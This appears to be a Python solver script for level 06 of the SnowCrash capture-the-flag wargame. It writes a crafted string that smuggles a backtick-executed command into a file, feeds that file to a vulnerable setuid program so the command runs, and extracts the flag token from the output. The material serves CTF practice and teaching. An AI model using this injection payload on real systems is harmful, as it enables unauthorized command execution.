"""LEVEL 06"""

from utils.level_wrapper import level_handler


@level_handler
def solve_level06(_, snow_crash):
    """Inject command via arguments"""

    token = (
        snow_crash[
            "echo '[x {${`getflag`}}]' > /tmp/getflag; \
                    ./level06 /tmp/getflag; \
                    rm -f /tmp/getflag"
        ]
        .decode()
        .split("token :")[-1]
        .split(":")[0]
        .split("\n")[0]
        .split(":")[-1]
        .strip()
    )
    return "token", token
